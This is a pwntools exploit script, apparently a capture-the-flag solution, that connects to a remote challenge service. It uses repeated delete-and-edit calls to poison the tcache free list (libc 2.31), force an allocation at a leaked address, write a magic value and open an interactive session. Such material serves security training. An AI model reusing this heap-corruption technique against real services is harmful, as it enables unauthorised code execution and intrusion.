from pwn import *

###Util
def create(size,owner,uuid,data):
    r.sendlineafter('Choice >','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Owner : ',owner)
    r.sendlineafter('UUID : ',str(uuid))
    r.sendafter('Content : ',data)

def edit(idx,uuid,data):
    r.sendlineafter('Choice >','2')
    r.sendlineafter('index : ',str(idx))
    r.sendlineafter('UUID : ',str(uuid))
    r.sendafter('Content : ',data)

def delete(idx):
    r.sendlineafter('Choice >','3')
    r.sendlineafter('index : ',str(idx))

def backdoor():
    r.sendlineafter('Choice >','4')

###Addr
#  libc2.31

###Exploit
r = remote('140.112.31.97',30106)

mmap_addr = int(r.recvline()[:-1].split(b'0x')[1],16)-0x18
print(hex(mmap_addr))

create(0x10,'M30W',0,'M30W')
delete(0)
edit(0,0,'M30W')
delete(0)
edit(0,0,'M30W')
delete(0)

create(0x10,p64(mmap_addr),0,'M30W')
create(0x10,'M30W',0,'M30W')
create(0x10,'M30W',0,p64(0xcafedeadbeefcafe))

backdoor()

r.interactive()
